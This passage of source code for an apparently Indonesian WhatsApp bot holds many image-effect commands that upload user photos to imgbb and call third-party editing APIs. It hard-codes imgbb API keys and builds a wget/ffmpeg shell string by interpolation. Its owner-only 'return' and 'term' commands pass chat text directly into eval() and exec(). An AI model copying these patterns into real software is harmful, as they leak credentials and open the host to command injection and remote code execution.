	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await zacky.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  hehe = await getBuffer(`https://leyscoders-api.herokuapp.com/api/img/hitler?url=${anu.display_url}&apikey=${leysKey}`)
	 zacky.sendMessage(from, hehe, image, {quoted: ftoko})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'trash':
	if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await zacky.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  hehe = await getBuffer(`https://leyscoders-api.herokuapp.com/api/img/trash?url=${anu.display_url}&apikey=${leysKey}`)
	 zacky.sendMessage(from, hehe, image, {quoted: ftoko})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'joke':
	if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))				
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  owgi = await zacky.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(6)
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  hehe = await getBuffer(`https://leyscoders-api.herokuapp.com/api/img/joke?url=${anu.display_url}&apikey=${leysKey}`)
	 zacky.sendMessage(from, hehe, image, {quoted: ftoko})	
	 }
	break
	case 'sepia':
	if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await zacky.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  hehe = await getBuffer(`https://leyscoders-api.herokuapp.com/api/img/sepia?url=${anu.display_url}&apikey=${leysKey}`)
	 zacky.sendMessage(from, hehe, image, {quoted: ftoko})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'alien':
	if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await zacky.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  hehe = await getBuffer(`https://lolhuman.herokuapp.com/api/editor/alien?apikey=${lolkey}&img=${anu.display_url}`)
	 zacky.sendMessage(from, hehe, image, {quoted: ftoko})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'removebg':
	if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await zacky.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(10)
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  hehe = await getBuffer(`https://lolhuman.herokuapp.com/api/removebg?apikey=${lolkey}&img=${anu.display_url}`)
	 zacky.sendMessage(from, hehe, image, {quoted: ftoko})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'smile':
	if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await zacky.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  hehe = await getBuffer(`https://lolhuman.herokuapp.com/api/editor/tosmile?apikey=${lolkey}&img=${anu.display_url}`)
	  zacky.sendMessage(from, hehe, image, {quoted: ftoko})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'skullmask':
	if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await zacky.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(11)
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  hehe = await getBuffer(`https://lolhuman.herokuapp.com/api/editor/skullmask?apikey=${lolkey}&img=${anu.display_url}`)
	  zacky.sendMessage(from, hehe, image, {quoted: ftoko})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'fisheye':
	if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await zacky.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(9)
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  hehe = await getBuffer(`https://lolhuman.herokuapp.com/api/editor/fisheye?apikey=${lolkey}&img=${anu.display_url}`)
	  zacky.sendMessage(from, hehe, image, {quoted: ftoko})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'deepfry':
	if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await zacky.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(9)
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  hehe = await getBuffer(`https://lolhuman.herokuapp.com/api/editor/deepfry?apikey=${lolkey}&img=${anu.display_url}`)
	  zacky.sendMessage(from, hehe, image, {quoted: ftoko})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'grayscale':
	if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await zacky.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(11)
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  hehe = await getBuffer(`https://lolhuman.herokuapp.com/api/editor/grayscale?apikey=${lolkey}&img=${anu.display_url}`)
	  zacky.sendMessage(from, hehe, image, {quoted: ftoko})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'imageflip':
	if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await zacky.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(11)
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  hehe = await getBuffer(`https://lolhuman.herokuapp.com/api/editor/flip?apikey=${lolkey}&img=${anu.display_url}`)
	  zacky.sendMessage(from, hehe, image, {quoted: ftoko})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'pixelate':
	if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await zacky.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(10)
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  hehe = await getBuffer(`https://lolhuman.herokuapp.com/api/editor/pixelate?apikey=${lolkey}&img=${anu.display_url}`)
	  zacky.sendMessage(from, hehe, image, {quoted: ftoko})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'imagerotate':
	if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await zacky.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(13)
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  hehe = await getBuffer(`https://lolhuman.herokuapp.com/api/editor/rotate?apikey=${lolkey}&img=${anu.display_url}`)
	  zacky.sendMessage(from, hehe, image, {quoted: ftoko})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'affect':
	if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await zacky.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(8)
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  hehe = await getBuffer(`https://leyscoders-api.herokuapp.com/api/img/affect?url=${anu.display_url}&apikey=${leysKey}`)
	  zacky.sendMessage(from, hehe, image, {quoted: ftoko})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'picture':
	if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await zacky.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  hehe = await getBuffer(`https://leyscoders-api.herokuapp.com/api/img/picture?url=${anu.display_url}&apikey=${leysKey}`)
	 zacky.sendMessage(from, hehe, image, {quoted: ftoko})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'blur':
	if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await zacky.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  hehe = await getBuffer(`https://leyscoders-api.herokuapp.com/api/img/blur?url=${anu.display_url}&apikey=${leysKey}`)
	 zacky.sendMessage(from, hehe, image, {quoted: ftoko})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'invert':
	if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await zacky.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  hehe = await getBuffer(`https://leyscoders-api.herokuapp.com/api/img/invert?url=${anu.display_url}&apikey=${leysKey}`)
	 zacky.sendMessage(from, hehe, image, {quoted: ftoko})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'meme':
	if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})				
				if (isLimit(sender)) return reply(ind.limitend(pusname))
				if (isBanned) return reply('Maaf kamu sudah terbenned!')
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await zacky.downloadAndSaveMediaMessage(ted)
	  ct = body.slice(6)
	  atas = ct.split("|")[0];
      bawah = ct.split("|")[1];
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  hehe = await getBuffer(`http://docs-jojo.herokuapp.com/api/meme-gen?top=${atas}&bottom=${bawah}&img=${anu.display_url}`)
	 zacky.sendMessage(from, hehe, image, {quoted: ftoko})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
			case 'gtav':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (isBanned) return reply(ind.baned())
if (isLimit(sender)) return reply(ind.limitend(pusname))
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
  reply(ind.wait())
  owgi = await zacky.downloadAndSaveMediaMessage(ted)
  tels = body.slice(7)
  anu = await imgbb("08579d070df9a07cb1c2ee565aece767", owgi)
  hedhe = await getBuffer(`https://videfikri.com/api/textmaker/gtavposter/?urlgbr=${anu.display_url}`)
 zacky.sendMessage(from, hedhe, image, {quoted:mek})
} else {
  reply('reply imagenya kak!')
}
break
			case 'gay':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (isBanned) return reply(ind.baned())
if (isLimit(sender)) return reply(ind.limitend(pusname))
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
  ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
  reply(ind.wait())
  owgi = await zacky.downloadAndSaveMediaMessage(ger)
  anu = await imgbb("08579d070df9a07cb1c2ee565aece767", owgi)
  teks = `${anu.display_url}`
  ranp = getRandom('.gif')
  rano = getRandom('.webp')
  anu1 = `https://some-random-api.ml/canvas/gay?avatar=${teks}`
  exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
if (err) return reply(error.stick)
nobg = fs.readFileSync(rano)
zacky.sendMessage(from, nobg, sticker, {
  quoted: mek
})
fs.unlinkSync(rano)
  })

} else {
  reply('Gunakan foto!')
}
break
	case 'nightbeach':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (isBanned) return reply(ind.baned())
if (isLimit(sender)) return reply(ind.limitend(pusname))
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
  reply(ind.wait())
  owgi = await zacky.downloadAndSaveMediaMessage(ted)
  tels = body.slice(7)
  anu = await imgbb("08579d070df9a07cb1c2ee565aece767", owgi)
  hehpe = await getBuffer(`https://videfikri.com/api/textmaker/nightbeach/?urlgbr=${anu.display_url}`)
 zacky.sendMessage(from, hehpe, image, {quoted:mek})
} else {
  reply('reply imagenya kak!')
}
break
	case 'laptop':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (isBanned) return reply(ind.baned())
if (isLimit(sender)) return reply(ind.limitend(pusname))
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
  reply(ind.wait())
  owgi = await zacky.downloadAndSaveMediaMessage(ted)
  tels = body.slice(7)
  anu = await imgbb("08579d070df9a07cb1c2ee565aece767", owgi)
  dhehe = await getBuffer(`https://videfikri.com/api/textmaker/customwp/?urlgbr=${anu.display_url}`)
 zacky.sendMessage(from, dhehe, image, {quoted:mek})
} else {
  reply('reply imagenya kak!')
}
break
	case 'linephoto':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (isBanned) return reply(ind.baned())
if (isLimit(sender)) return reply(ind.limitend(pusname))
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
  reply(ind.wait())
  owgi = await zacky.downloadAndSaveMediaMessage(ted)
  tels = body.slice(7)
  anu = await imgbb("08579d070df9a07cb1c2ee565aece767", owgi)
  hehet = await getBuffer(`https://videfikri.com/api/textmaker/3dlinephoto/?urlgbr=${anu.display_url}`)
 zacky.sendMessage(from, hehet, image, {quoted:mek})
} else {
  reply('reply imagenya kak!')
}
break
	case 'raindrop':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (isBanned) return reply(ind.baned())
if (isLimit(sender)) return reply(ind.limitend(pusname))
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
  reply(ind.wait())
  owgi = await zacky.downloadAndSaveMediaMessage(ted)
  tels = body.slice(7)
  anu = await imgbb("08579d070df9a07cb1c2ee565aece767", owgi)
  hehre = await getBuffer(`https://videfikri.com/api/textmaker/raindrop/?urlgbr=${anu.display_url}`)
 zacky.sendMessage(from, hehre, image, {quoted:mek})
} else {
  reply('reply imagenya kak!')
}
break
	case 'sketch':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (isBanned) return reply(ind.baned())
if (isLimit(sender)) return reply(ind.limitend(pusname))
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
  reply(ind.wait())
  owgi = await zacky.downloadAndSaveMediaMessage(ted)
  tels = body.slice(7)
  anu = await imgbb("08579d070df9a07cb1c2ee565aece767", owgi)
  hehae = await getBuffer(`https://videfikri.com/api/textmaker/pencil/?urlgbr=${anu.display_url}`)
 zacky.sendMessage(from, hehae, image, {quoted:mek})
} else {
  reply('reply imagenya kak!')
}
break
	case 'facebookpage':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (isBanned) return reply(ind.baned())
if (isLimit(sender)) return reply(ind.limitend(pusname))
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await zacky.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(14)
	  anu = await imgbb("08579d070df9a07cb1c2ee565aece767", owgi)
	  hehe = await getBuffer(`https://videfikri.com/api/textmaker/facebookprof/?urlgbr=${anu.display_url}&text=${tels}`)
	 zacky.sendMessage(from, hehe, image, {quoted: ftoko})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'costumwp':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (isBanned) return reply(ind.baned())
if (isLimit(sender)) return reply(ind.limitend(pusname))
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await zacky.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(14)
	  anu = await imgbb("08579d070df9a07cb1c2ee565aece767", owgi)
	  hehe = await getBuffer(`https://videfikri.com/api/textmaker/customwp/?urlgbr=${anu.display_url}`)
	 zacky.sendMessage(from, hehe, image, {quoted: ftoko})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'pantaimalam':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (isBanned) return reply(ind.baned())
if (isLimit(sender)) return reply(ind.limitend(pusname))
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await zacky.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(14)
	  anu = await imgbb("08579d070df9a07cb1c2ee565aece767", owgi)
	  hehe = await getBuffer(`https://videfikri.com/api/textmaker/nightbeach/?urlgbr=${anu.display_url}`)
	 zacky.sendMessage(from, hehe, image, {quoted: ftoko})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'pencil':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (isBanned) return reply(ind.baned())
if (isLimit(sender)) return reply(ind.limitend(pusname))
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await zacky.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(14)
	  anu = await imgbb("08579d070df9a07cb1c2ee565aece767", owgi)
	  hehe = await getBuffer(`https://videfikri.com/api/textmaker/pencil/?urlgbr=${anu.display_url}`)
	 zacky.sendMessage(from, hehe, image, {quoted: ftoko})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'bakar':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (isBanned) return reply(ind.baned())
if (isLimit(sender)) return reply(ind.limitend(pusname))
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await zacky.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("08579d070df9a07cb1c2ee565aece767", owgi)
	  hehe = await getBuffer(`https://videfikri.com/api/textmaker/burneffect/?urlgbr=${anu.display_url}`)
	 zacky.sendMessage(from, hehe, image, {quoted: ftoko})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	case 'crossgun':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
if (isBanned) return reply(ind.baned())
if (isLimit(sender)) return reply(ind.limitend(pusname))
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait())
	  owgi = await zacky.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("08579d070df9a07cb1c2ee565aece767", owgi)
	  hehe = await getBuffer(`https://videfikri.com/api/textmaker/crossgun/?urlgbr=${anu.display_url}`)
	  zacky.sendMessage(from, hehe, image, {quoted: ftoko})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break
	//SYSTEM BY Manik
        case 'return':
                if (!isOwner) return reply('Owner Only')
				return zacky.sendMessage(from, JSON.stringify(eval(args.join(''))), text, {quoted: mek})
				break
				    case 'term':
				if (!isOwner) return reply('Owner Only')
				const cmd = body.slice(6)
				var itsme = `${numbernye}@s.whatsapp.net`
				var split = `*EXECUTOR*`
				const term = {
					contextInfo: {
						participant: itsme,
						quotedMessage: {
							extendedTextMessage: {
								text: split,
							}
						}
					}
				}
				exec(cmd, (err, stdout) => {
					if (err) return zacky.sendMessage(from, `EXEC ${err}`, text, { quoted: mek })
					if (stdout) {
						zacky.sendMessage(from, stdout, text, term)
					}
				})
				break
				    case 'sendkontak':
				    if (!isRegistered && !mek.key.fromMe && !isOwner) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
				    if (isBanned) return reply('Lu sudah terbenned!')
